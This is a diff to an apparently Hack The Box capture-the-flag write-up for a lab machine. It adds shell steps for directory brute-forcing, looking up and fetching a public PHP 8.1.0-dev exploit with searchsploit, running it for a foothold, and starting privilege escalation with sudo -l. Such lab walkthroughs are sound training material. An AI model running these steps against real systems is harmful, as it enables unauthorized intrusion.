@@ -163,7 +163,7 @@ Content-Type: text/html; charset=UTF-8
 
 Directory Brute-force
 ```shell
-feroxbuster -u http://10.10.10.242 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -s 200 -n
+root@kali# feroxbuster -u http://10.10.10.242 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -s 200 -n
 ```
 ```shell
  ___  ___  __   __     __      __         __   ___
@@ -188,3 +188,28 @@ by Ben "epi" Risher 🤓                 ver: 2.10.0
 [####################] - 2m     43010/43010   0s      found:1       errors:0      
 [####################] - 2m     43008/43008   339/s   http://10.10.10.242/    
 ```
+
+Search Exploits
+```shell
+root@kali# searchsploit php 8.1.0-dev
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9a6d5d5f-77da-4404-b41c-7ab103cc9c0d)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/aeb47e9b-a199-4e88-a4c5-f4af6fd5fb49)
+
+```shell
+searchsploit -m php/webapps/49933.py
+```
+
+Foothold
+```shell
+root@kali# python3 49933.py 
+Enter the full host url:
+http://10.10.10.242
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0b5ab08e-2358-4b28-987a-c8eed3cfa2d4)
+
+Privilege Escalation
+```shell
+$ sudo -l
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b60d1e36-fb10-47a8-8d32-203b4583b59f)
